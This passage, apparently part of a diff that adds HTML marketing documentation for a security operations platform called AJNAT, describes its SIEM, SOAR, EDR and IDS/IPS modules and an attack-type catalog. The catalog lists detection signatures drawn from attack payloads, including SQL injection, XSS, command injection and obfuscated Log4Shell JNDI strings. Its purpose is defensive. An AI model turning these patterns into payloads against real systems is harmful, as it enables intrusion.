+        <div class="arch-layer-desc">Unified Console · Incident Management · Threat Hunting · Reporting · RBAC Multi-Tenant · Compliance Reporting</div>
+      </div>
+    </div>
+  </div>
+
+  <h2>2.2 Data Flow Architecture</h2>
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">Event Volume Distribution by Source</div>
+      <canvas id="eventVolumeChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">Alert Severity Distribution (30-Day)</div>
+      <canvas id="alertSeverityChart"></canvas>
+    </div>
+  </div>
+
+  <h2>2.3 Deployment Models</h2>
+  <table>
+    <thead><tr><th>Deployment Type</th><th>Description</th><th>Best For</th><th>HA Support</th></tr></thead>
+    <tbody>
+      <tr><td><strong>On-Premise</strong></td><td>Full stack on customer hardware within secure data center</td><td>Government, Defense, Critical Infrastructure</td><td>Active-Active Cluster</td></tr>
+      <tr><td><strong>Private Cloud</strong></td><td>Deployed on customer-managed cloud (AWS GovCloud, Azure Gov)</td><td>Regulated industries, Banking</td><td>Multi-AZ Redundancy</td></tr>
+      <tr><td><strong>Hybrid</strong></td><td>Core on-premise with cloud log archival and backup</td><td>Enterprise with compliance needs</td><td>Active-Passive Failover</td></tr>
+      <tr><td><strong>Air-Gap</strong></td><td>Fully isolated network with no external connectivity</td><td>Classified environments, Military</td><td>Standalone HA Pair</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 3 — SIEM
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 03</div>
+    <div class="chapter-title">SIEM — Security Information &amp; Event Management</div>
+    <div class="chapter-subtitle">Centralized log aggregation, real-time correlation, and intelligent alerting at enterprise scale</div>
+  </div>
+
+  <p>
+    The AJNAT SIEM engine is the central nervous system of the platform. It continuously ingests, normalizes, indexes, and correlates
+    security events from every connected source — network devices, endpoints, cloud services, applications, and external threat feeds.
+    The SIEM processes up to <strong>10 million events per day</strong> with sub-second latency and stores structured event data in a
+    high-performance time-series datastore for forensic investigation and compliance reporting.
+  </p>
+
+  <div class="metric-grid">
+    <div class="metric-card blue">
+      <div class="metric-value">10M+</div>
+      <div class="metric-label">Events/Day</div>
+    </div>
+    <div class="metric-card cyan">
+      <div class="metric-value">&lt;500ms</div>
+      <div class="metric-label">Indexing Latency</div>
+    </div>
+    <div class="metric-card green">
+      <div class="metric-value">365</div>
+      <div class="metric-label">Days Retention</div>
+    </div>
+    <div class="metric-card orange">
+      <div class="metric-value">50+</div>
+      <div class="metric-label">Log Source Types</div>
+    </div>
+  </div>
+
+  <h2>3.1 Log Ingestion Sources</h2>
+  <table>
+    <thead><tr><th>Category</th><th>Source Types</th><th>Protocol</th><th>Normalization</th></tr></thead>
+    <tbody>
+      <tr><td>Network</td><td>Firewalls, Routers, Switches, Load Balancers</td><td>Syslog, SNMP, NetFlow</td><td>CEF, Leef, JSON</td></tr>
+      <tr><td>Endpoint</td><td>Windows Event Log, Linux Syslog, macOS Unified Logs</td><td>Agent Push, WMI</td><td>ECS Schema</td></tr>
+      <tr><td>Cloud</td><td>AWS CloudTrail, Azure Monitor, GCP Cloud Logging</td><td>API Pull, Webhooks</td><td>JSON → ECS</td></tr>
+      <tr><td>Application</td><td>Web Servers, Databases, Custom Apps, APIs</td><td>HTTP/HTTPS, Kafka</td><td>Custom parsers</td></tr>
+      <tr><td>Security Tools</td><td>IDS/IPS, WAF, EDR, Vulnerability Scanners</td><td>Native API, Syslog</td><td>Native schema</td></tr>
+      <tr><td>Identity</td><td>Active Directory, LDAP, Okta, Azure AD</td><td>WMI, API, Syslog</td><td>User context enrichment</td></tr>
+    </tbody>
+  </table>
+
+  <h2>3.2 Correlation Engine</h2>
+  <p>
+    The correlation engine applies multi-stage rule logic to raw events to identify attack patterns that span multiple systems,
+    time windows, and event types. It supports both <strong>signature-based rules</strong> (detecting known attack patterns)
+    and <strong>statistical correlation</strong> (detecting behavioral anomalies based on baselines).
+  </p>
+
+  <div class="flow-steps">
+    <div class="flow-step">
+      <div class="flow-step-num">1</div>
+      <div class="flow-step-content">
+        <h4>Event Normalization</h4>
+        <p>Raw logs from all sources are parsed and normalized to a common Elastic Common Schema (ECS) format, enriching each event with user context, asset inventory data, and geolocation.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">2</div>
+      <div class="flow-step-content">
+        <h4>Threat Intelligence Enrichment</h4>
+        <p>Every IP address, domain, file hash, and URL is checked against 15+ threat intelligence feeds in real time. Malicious IOCs are flagged instantly.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">3</div>
+      <div class="flow-step-content">
+        <h4>Rule-Based Correlation</h4>
+        <p>Over 400 built-in correlation rules apply to the normalized event stream. Rules detect multi-step attack chains, lateral movement, privilege escalation, and data exfiltration patterns.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">4</div>
+      <div class="flow-step-content">
+        <h4>AI/ML Anomaly Scoring</h4>
+        <p>The AI engine scores each correlated alert against behavioral baselines. Alerts with anomaly scores above threshold are escalated automatically.</p>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-step-num">5</div>
+      <div class="flow-step-content">
+        <h4>Alert Generation &amp; SOAR Trigger</h4>
+        <p>Final alerts are created with full context, evidence trail, affected assets, recommended actions, and MITRE ATT&amp;CK mapping. High-severity alerts trigger SOAR playbooks automatically.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 4 — SOAR
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 04</div>
+    <div class="chapter-title">SOAR — Security Orchestration, Automation &amp; Response</div>
+    <div class="chapter-subtitle">Automated playbooks that compress analyst response from hours to seconds</div>
+  </div>
+
+  <p>
+    AJNAT SOAR transforms the SOC from a reactive firefighting operation to a proactive, automated defense machine.
+    When a high-severity threat is detected, SOAR playbooks execute in milliseconds — isolating compromised endpoints,
+    blocking malicious IPs, notifying analysts, opening incident tickets, and capturing forensic evidence — all without
+    requiring any human intervention in the first critical minutes of an attack.
+  </p>
+
+  <div class="metric-grid">
+    <div class="metric-card green">
+      <div class="metric-value">100+</div>
+      <div class="metric-label">Built-in Playbooks</div>
+    </div>
+    <div class="metric-card blue">
+      <div class="metric-value">&lt;100ms</div>
+      <div class="metric-label">Playbook Execution</div>
+    </div>
+    <div class="metric-card cyan">
+      <div class="metric-value">87%</div>
+      <div class="metric-label">Auto-Resolution Rate</div>
+    </div>
+    <div class="metric-card orange">
+      <div class="metric-value">60x</div>
+      <div class="metric-label">Faster Than Manual</div>
+    </div>
+  </div>
+
+  <h2>4.1 Core Playbook Categories</h2>
+  <table>
+    <thead><tr><th>Playbook Category</th><th>Trigger Condition</th><th>Automated Actions</th><th>Escalation</th></tr></thead>
+    <tbody>
+      <tr><td><strong>IP Block Response</strong></td><td>Critical/High threat from IP</td><td>Block IP on Firewall, WAF, IPS; Log forensics; Alert SOC</td><td>SOC L2 analyst if whitelisted</td></tr>
+      <tr><td><strong>Endpoint Isolation</strong></td><td>Malware detected, C2 connection</td><td>Network isolate endpoint, Kill process, Snapshot memory</td><td>IR team for containment</td></tr>
+      <tr><td><strong>DDoS Mitigation</strong></td><td>&gt;50 req/sec from single IP</td><td>Rate-limit, Geo-block, CDN offload, Alert NOC</td><td>NOC + CISO for sustained attack</td></tr>
+      <tr><td><strong>Credential Compromise</strong></td><td>Brute force + successful login</td><td>Force password reset, Revoke sessions, MFA enforce</td><td>Identity team + user notification</td></tr>
+      <tr><td><strong>Data Exfiltration</strong></td><td>Large outbound transfer, DNS tunnel</td><td>Block destination, Capture traffic, Isolate source</td><td>Legal + CISO for data breach</td></tr>
+      <tr><td><strong>Web Attack Response</strong></td><td>SQLi, XSS, Web Shell detected</td><td>Block request, WAF rule add, Log payload, Alert dev team</td><td>App security team</td></tr>
+      <tr><td><strong>Log4Shell (CVE) Response</strong></td><td>Log4Shell pattern in any field</td><td>Block source IP, Alert all teams, Scan all endpoints, Patch check</td><td>CISO immediate escalation</td></tr>
+      <tr><td><strong>Insider Threat</strong></td><td>Unusual data access by internal user</td><td>Alert manager, Capture session, Create HR ticket</td><td>HR + Legal + CISO</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-warning">
+    <div class="callout-title">⚠️ Automated Action Scope</div>
+    All automated SOAR actions are logged with cryptographic signatures and can be reviewed, audited, and overridden by authorized SOC managers.
+    Critical actions (endpoint isolation, account lockout) require dual-approval in high-security environments if configured.
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 5 — EDR / XDR
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 05</div>
+    <div class="chapter-title">EDR / XDR — Endpoint &amp; Extended Detection &amp; Response</div>
+    <div class="chapter-subtitle">Deep endpoint telemetry, process behavior analysis, and file integrity monitoring</div>
+  </div>
+
+  <p>
+    The AJNAT EDR agent is a lightweight, high-performance security agent deployed on Windows and Linux endpoints.
+    It continuously monitors every process, network connection, file change, and registry modification — streaming
+    telemetry to the central SOC platform for real-time analysis. The XDR layer extends visibility across
+    cloud workloads, network traffic, and identity events to provide complete attack chain reconstruction.
+  </p>
+
+  <div class="metric-grid">
+    <div class="metric-card blue">
+      <div class="metric-value">&lt;3%</div>
+      <div class="metric-label">CPU Overhead</div>
+      <div class="metric-sub">Lightweight agent</div>
+    </div>
+    <div class="metric-card green">
+      <div class="metric-value">15+</div>
+      <div class="metric-label">Telemetry Streams</div>
+    </div>
+    <div class="metric-card orange">
+      <div class="metric-value">100%</div>
+      <div class="metric-label">Process Visibility</div>
+    </div>
+    <div class="metric-card purple">
+      <div class="metric-value">FIM</div>
+      <div class="metric-label">File Integrity Monitor</div>
+    </div>
+  </div>
+
+  <h2>5.1 EDR Monitoring Capabilities</h2>
+  <table>
+    <thead><tr><th>Category</th><th>Monitored Artifacts</th><th>Detection Focus</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Process Monitoring</strong></td><td>Process tree, command-line args, parent-child relationships, hashes</td><td>Malware execution, LOLBins, Defense evasion</td></tr>
+      <tr><td><strong>Network Connections</strong></td><td>All TCP/UDP connections, DNS queries, listening ports</td><td>C2 beaconing, Lateral movement, DNS tunneling</td></tr>
+      <tr><td><strong>File Activity (FIM)</strong></td><td>File creates, reads, writes, deletes, permission changes</td><td>Ransomware, Data staging, Credential theft</td></tr>
+      <tr><td><strong>Registry Monitoring</strong></td><td>Registry reads, writes, deletes, Run keys, Service entries</td><td>Persistence mechanisms, Startup hijacking</td></tr>
+      <tr><td><strong>Memory Analysis</strong></td><td>Injected code detection, Hollowing detection, DLL anomalies</td><td>Fileless malware, Process injection, Shellcode</td></tr>
+      <tr><td><strong>User Activity</strong></td><td>Login events, Privilege use, Sudo/RunAs, Remote sessions</td><td>Insider threats, Privilege escalation</td></tr>
+      <tr><td><strong>Script Execution</strong></td><td>PowerShell, Bash, Python, WMI scripts</td><td>Living-off-the-land (LOTL) attacks</td></tr>
+    </tbody>
+  </table>
+
+  <h2>5.2 File Integrity Monitoring (FIM) Module</h2>
+  <p>
+    The FIM module is the most granular layer of endpoint monitoring. It tracks every file system change within
+    configured monitoring scopes — including system binaries, configuration files, web application directories,
+    and sensitive data paths. Changes are cryptographically hashed and compared against known-good baselines.
+  </p>
+  <ul>
+    <li><strong>Real-time SHA-256 Hashing:</strong> Every file modification triggers immediate hash verification</li>
+    <li><strong>Baseline Management:</strong> Approved baselines can be established and any deviation triggers an alert</li>
+    <li><strong>Ransomware Detection:</strong> Mass file modification/encryption patterns detected within 5 seconds</li>
+    <li><strong>Compliance Verification:</strong> Automated evidence generation for PCI-DSS, HIPAA, and ISO 27001 FIM controls</li>
+    <li><strong>Web Shell Detection:</strong> Monitors web directories for unauthorized PHP, ASPX, or JSP file creation</li>
+  </ul>
+
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">EDR Event Categories (Daily Average)</div>
+      <canvas id="edrEventsChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">EDR Threat Detection by Severity</div>
+      <canvas id="edrSeverityChart"></canvas>
+    </div>
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 6 — IDS / IPS
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 06</div>
+    <div class="chapter-title">IDS / IPS — Intrusion Detection &amp; Prevention System</div>
+    <div class="chapter-subtitle">Deep-packet inspection, signature-based detection, and real-time network threat blocking</div>
+  </div>
+
+  <p>
+    The AJNAT IDS/IPS subsystem forms the primary network defense perimeter. It operates in two modes simultaneously:
+    <strong>Intrusion Detection (IDS)</strong> — passively monitoring and alerting on suspicious traffic —
+    and <strong>Intrusion Prevention (IPS)</strong> — actively blocking malicious packets and connections in real time.
+    The engine is powered by <strong>Suricata</strong> for high-performance deep-packet inspection and <strong>Zeek (Bro)</strong>
+    for application-layer traffic analysis and behavioral logging.
+  </p>
+
+  <div class="metric-grid">
+    <div class="metric-card red">
+      <div class="metric-value">16+</div>
+      <div class="metric-label">Attack Categories</div>
+      <div class="metric-sub">Auto-classified</div>
+    </div>
+    <div class="metric-card cyan">
+      <div class="metric-value">10Gbps</div>
+      <div class="metric-label">Inspection Capacity</div>
+      <div class="metric-sub">Zero packet loss</div>
+    </div>
+    <div class="metric-card green">
+      <div class="metric-value">&lt;1ms</div>
+      <div class="metric-label">Block Latency</div>
+      <div class="metric-sub">Inline prevention mode</div>
+    </div>
+    <div class="metric-card orange">
+      <div class="metric-value">4</div>
+      <div class="metric-label">Threat Severity Levels</div>
+      <div class="metric-sub">Critical / High / Medium / Low</div>
+    </div>
+  </div>
+
+  <h2>6.1 Operating Modes</h2>
+  <table>
+    <thead><tr><th>Mode</th><th>Sensor</th><th>Action</th><th>Use Case</th></tr></thead>
+    <tbody>
+      <tr><td><strong>IDS — Detect Only</strong></td><td>Suricata / Zeek</td><td>Generate alert, log event</td><td>Monitoring without disrupting traffic</td></tr>
+      <tr><td><strong>IPS — Block</strong></td><td>Suricata (inline)</td><td>Drop packet, block IP, alert SOC</td><td>Active threat prevention</td></tr>
+      <tr><td><strong>Hybrid</strong></td><td>Both</td><td>Alert on medium/low; Block on high/critical</td><td>Enterprise production environments</td></tr>
+    </tbody>
+  </table>
+
+  <h2>6.2 Policy Engine</h2>
+  <p>
+    The IDS/IPS Policy Engine allows security administrators to define granular detection and prevention rules with
+    full control over sensor selection, severity thresholds, protocol filtering, source/destination IP scoping,
+    and response actions. Policies can be imported from preset libraries or custom-built using the policy editor.
+  </p>
+  <ul>
+    <li><strong>Sensor Selection:</strong> Route traffic to Suricata, Zeek, or both simultaneously</li>
+    <li><strong>Severity Threshold:</strong> Minimum severity to trigger action (Low / Medium / High / Critical)</li>
+    <li><strong>Protocol Filter:</strong> Apply rules only to specific protocols (TCP, UDP, HTTP, DNS, SMTP, etc.)</li>
+    <li><strong>Attack Pattern:</strong> Regex-based payload matching for custom threat signatures</li>
+    <li><strong>Source/Destination Scoping:</strong> Apply policies to specific IP ranges, subnets, or named assets</li>
+    <li><strong>Match Counting:</strong> Track how many times each policy has triggered for tuning and auditing</li>
+  </ul>
+
+  <h2>6.3 Suricata + Zeek Integration</h2>
+  <table>
+    <thead><tr><th>Engine</th><th>Strengths</th><th>Output Format</th><th>Best For</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Suricata</strong></td><td>High-speed packet inspection, rule-based detection, inline blocking</td><td>EVE JSON, PCAP</td><td>Attack signatures, DDoS, exploit detection</td></tr>
+      <tr><td><strong>Zeek (Bro)</strong></td><td>Protocol analysis, behavioral logging, custom scripts</td><td>TSV logs, JSON</td><td>Behavioral analysis, application-layer visibility</td></tr>
+      <tr><td><strong>Combined</strong></td><td>Full packet + behavior coverage with AI correlation</td><td>Unified AJNAT schema</td><td>Enterprise SOC with complete network visibility</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 7 — IPS ATTACK TYPE CATALOG
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 07</div>
+    <div class="chapter-title">IPS Attack Type Catalog &amp; Detection Mechanisms</div>
+    <div class="chapter-subtitle">Complete reference of all 16+ attack categories detected and blocked by AJNAT IPS with detection logic, scoring, and response actions</div>
+  </div>
+
+  <p>
+    The AJNAT IPS engine classifies every detected threat into one of <strong>16+ distinct attack categories</strong>.
+    Each category has dedicated pattern libraries (regex-based payload signatures), behavioral scoring rules,
+    confidence weighting, and automated response actions. The threat scoring engine produces a composite risk score
+    from 0–100, which determines severity level (Critical / High / Medium / Low) and triggers the appropriate
+    automated response chain.
+  </p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">🔍 Threat Scoring Formula</div>
+    <strong>Risk Score = Σ(Pattern Match Weight + Behavioral Score + IP Reputation Score + Rate Anomaly Score)</strong><br/>
+    Scores ≥ 80 → Critical &nbsp;|&nbsp; Scores 55–79 → High &nbsp;|&nbsp; Scores 30–54 → Medium &nbsp;|&nbsp; Scores &lt;30 → Low
+  </div>
+
+  <h2>7.1 Attack Type Overview — Detection &amp; Response Matrix</h2>
+  <table>
+    <thead><tr><th>Attack Type</th><th>ATTACK_TYPE Code</th><th>Detection Method</th><th>Base Score</th><th>Severity</th><th>Primary Response</th></tr></thead>
+    <tbody>
+      <tr><td><strong>SQL Injection</strong></td><td><code>SQL_INJECTION</code></td><td>Payload regex (18 patterns)</td><td>75</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Log Forensics</td></tr>
+      <tr><td><strong>Cross-Site Scripting</strong></td><td><code>XSS</code></td><td>Payload regex (15 patterns)</td><td>75</td><td><span class="badge badge-high">High</span></td><td>Block + WAF Rule</td></tr>
+      <tr><td><strong>Brute Force</strong></td><td><code>BRUTE_FORCE</code></td><td>Failed auth count &gt;5</td><td>60</td><td><span class="badge badge-high">High</span></td><td>Block IP + Rate Limit</td></tr>
+      <tr><td><strong>DDoS / Flood</strong></td><td><code>DDOS</code></td><td>Request rate &gt;50 req/sec</td><td>Variable</td><td><span class="badge badge-critical">Critical</span></td><td>Rate Limit + Geo Block</td></tr>
+      <tr><td><strong>Port Scan</strong></td><td><code>PORT_SCAN</code></td><td>Port count &gt;10 from single IP</td><td>70</td><td><span class="badge badge-high">High</span></td><td>Block + Alert Analyst</td></tr>
+      <tr><td><strong>Malware / Virus</strong></td><td><code>MALWARE</code></td><td>Payload signature hash match</td><td>75</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Isolate System</td></tr>
+      <tr><td><strong>Botnet Activity</strong></td><td><code>BOTNET</code></td><td>IP reputation: botnet/malicious</td><td>80</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Geo Block + SOC Alert</td></tr>
+      <tr><td><strong>Data Exfiltration</strong></td><td><code>DATA_EXFILTRATION</code></td><td>Large payload + unusual destination</td><td>75</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Forensic Capture</td></tr>
+      <tr><td><strong>Privilege Escalation</strong></td><td><code>PRIVILEGE_ESCALATION</code></td><td>sudo/runas/chmod payload patterns</td><td>75</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Isolate + Alert CISO</td></tr>
+      <tr><td><strong>Credential Theft</strong></td><td><code>CREDENTIAL_THEFT</code></td><td>Password/token extraction patterns</td><td>75</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Force Reset + Alert</td></tr>
+      <tr><td><strong>Web Shell Injection</strong></td><td><code>WEB_SHELL</code></td><td>Payload regex + file upload patterns</td><td>75</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Isolate System</td></tr>
+      <tr><td><strong>Command Injection</strong></td><td><code>COMMAND_INJECTION</code></td><td>Shell metacharacter + cmd patterns</td><td>75</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Isolate + Forensics</td></tr>
+      <tr><td><strong>Path Traversal / LFI</strong></td><td><code>PATH_TRAVERSAL</code></td><td>../  %2e%2e/ patterns</td><td>75</td><td><span class="badge badge-high">High</span></td><td>Block + WAF Rule</td></tr>
+      <tr><td><strong>SSRF</strong></td><td><code>SSRF</code></td><td>Internal IP in URL params, metadata endpoints</td><td>75</td><td><span class="badge badge-critical">Critical</span></td><td>Block + Alert Dev Team</td></tr>
+      <tr><td><strong>Log4Shell (CVE-2021-44228)</strong></td><td><code>LOG4SHELL</code></td><td>${jndi:ldap pattern matching</td><td>75+</td><td><span class="badge badge-critical">Critical</span></td><td>Block + CISO Immediate Alert + Patch Scan</td></tr>
+      <tr><td><strong>DNS Tunneling</strong></td><td><code>DNS_TUNNEL</code></td><td>Base64/hex DNS query patterns</td><td>75</td><td><span class="badge badge-high">High</span></td><td>Block + DNS Sinkhole</td></tr>
+      <tr><td><strong>Suspicious Activity</strong></td><td><code>SUSPICIOUS</code></td><td>Score-based, no single match</td><td>20–54</td><td><span class="badge badge-medium">Medium</span></td><td>Monitor + Log + Analyst Review</td></tr>
+    </tbody>
+  </table>
+
+  <h2>7.2 Attack Distribution &amp; Prevalence Charts</h2>
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">Attack Type Frequency Distribution (IPS Blocks — 90 Day)</div>
+      <canvas id="ipsAttackDistChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">Attack Severity Breakdown</div>
+      <canvas id="ipsAttackSeverityChart"></canvas>
+    </div>
+  </div>
+
+  <div class="chart-row chart-row-2">
+    <div class="chart-box">
+      <div class="chart-box-title">Attack Detection Base Score by Type</div>
+      <canvas id="ipsBaseScoreChart"></canvas>
+    </div>
+    <div class="chart-box">
+      <div class="chart-box-title">IPS Block Actions vs. Detection-Only (30 Days)</div>
+      <canvas id="ipsActionChart"></canvas>
+    </div>
+  </div>
+
+  <h2>7.3 Detailed Attack Profiles</h2>
+  <p>The following profiles provide in-depth technical coverage of each attack category, including detection signatures, confidence scoring, behavioral indicators, and real-world threat examples.</p>
+
+  <div class="attack-grid">
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 SQL Injection (SQLi)</div>
+      <div class="attack-desc">Attacker injects malicious SQL code into input fields to manipulate database queries. Can result in unauthorized data access, data deletion, or full database compromise.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">18 Patterns</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:82%; background:#ef4444;"></div></div>
+        <span class="severity-bar-pct">82%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Patterns:</strong> UNION SELECT, DROP TABLE, OR 1=1, xp_cmdshell, WAITFOR DELAY, INTO OUTFILE, information_schema queries
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 Cross-Site Scripting (XSS)</div>
+      <div class="attack-desc">Injects malicious JavaScript into web pages viewed by other users. Enables session hijacking, credential theft, and browser-based attacks against users.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">15 Patterns</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:71%; background:#ef4444;"></div></div>
+        <span class="severity-bar-pct">71%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Patterns:</strong> &lt;script&gt;, javascript:, onerror=, onload=, &lt;iframe&gt;, eval(), document.cookie, vbscript:
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 DDoS / Distributed Flood Attack</div>
+      <div class="attack-desc">Overwhelms target systems with massive request volumes from multiple sources. Detects rate spikes &gt;50 req/sec from a single IP, with volumetric scoring up to 90+ points.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">Rate-Based</span>
+        <span class="badge badge-purple">Score up to +90</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:65%; background:#dc2626;"></div></div>
+        <span class="severity-bar-pct">65%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Response:</strong> Rate-limit + Geo-block + CDN offload + Rate-limit alert to NOC + CISO escalation
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 Botnet Activity</div>
+      <div class="attack-desc">Traffic originating from IPs classified in botnet threat intelligence feeds. Highest base score (80+) due to confirmed malicious infrastructure attribution.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">Threat Intel</span>
+        <span class="badge badge-purple">Score +80</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:58%; background:#dc2626;"></div></div>
+        <span class="severity-bar-pct">58%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Sources:</strong> Shodan Honeypots, AbuseIPDB, AlienVault OTX, Emerging Threats, Talos Intelligence
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 Log4Shell (CVE-2021-44228)</div>
+      <div class="attack-desc">Critical RCE vulnerability in Apache Log4j. Attacker injects ${jndi:ldap://} payload to trigger remote code execution. One of the most severe CVEs ever discovered (CVSS 10.0).</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">CVSS 10.0</span>
+        <span class="badge badge-blue">CVE Detection</span>
+        <span class="badge badge-purple">Score +75+</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Impact</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:100%; background:#7c2d12;"></div></div>
+        <span class="severity-bar-pct">100%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Pattern:</strong> ${jndi:ldap://}, ${jndi:rmi://}, ${${::-j}${::-n}...} — including obfuscated variants
+      </div>
+    </div>
+
+    <div class="attack-card critical">
+      <div class="attack-name">🔴 Malware / Virus Signature</div>
+      <div class="attack-desc">Known malware signatures detected in network traffic payloads or file transfers. Matched against continuously updated malware signature databases and VirusTotal feeds.</div>
+      <div class="attack-badges">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-blue">Signature DB</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:45%; background:#dc2626;"></div></div>
+        <span class="severity-bar-pct">45%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Response:</strong> Block + System Isolation + Memory Snapshot + Forensic Chain of Custody
+      </div>
+    </div>
+
+    <div class="attack-card high">
+      <div class="attack-name">🟠 Brute Force Attack</div>
+      <div class="attack-desc">Repeated authentication attempts to guess credentials. Triggered when &gt;5 failed login attempts detected from a single IP within the rate window (60 seconds).</div>
+      <div class="attack-badges">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-blue">Rate-Based</span>
+        <span class="badge badge-purple">Score +60</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:79%; background:#ea580c;"></div></div>
+        <span class="severity-bar-pct">79%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Variants:</strong> Password spraying, Credential stuffing, Dictionary attacks, Slow-and-low brute force
+      </div>
+    </div>
+
+    <div class="attack-card high">
+      <div class="attack-name">🟠 Command Injection</div>
+      <div class="attack-desc">Attacker injects OS commands into application inputs to execute arbitrary system commands. Detects shell metacharacters and known command execution patterns.</div>
+      <div class="attack-badges">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-blue">6 Patterns</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:52%; background:#ea580c;"></div></div>
+        <span class="severity-bar-pct">52%</span>
+      </div>
+      <div style="margin-top:8px; font-size:8.5pt; color:#64748b;">
+        <strong>Patterns:</strong> exec(), system(), shell_exec(), | cat, | whoami, ; id, `backtick execution`, $() subshell
+      </div>
+    </div>
+
+    <div class="attack-card high">
+      <div class="attack-name">🟠 Web Shell Injection</div>
+      <div class="attack-desc">Attacker uploads a malicious script to a web server to maintain persistent remote access. Detected via payload patterns and FIM file monitoring on web directories.</div>
+      <div class="attack-badges">
+        <span class="badge badge-high">High→Critical</span>
+        <span class="badge badge-blue">Payload + FIM</span>
+        <span class="badge badge-purple">Score +75</span>
+      </div>
+      <div class="severity-bar-wrap" style="margin-top:10px;">
+        <span class="severity-label">Frequency</span>
+        <div class="severity-bar-bg"><div class="severity-bar-fill" style="width:38%; background:#ea580c;"></div></div>
+        <span class="severity-bar-pct">38%</span>
+      </div>
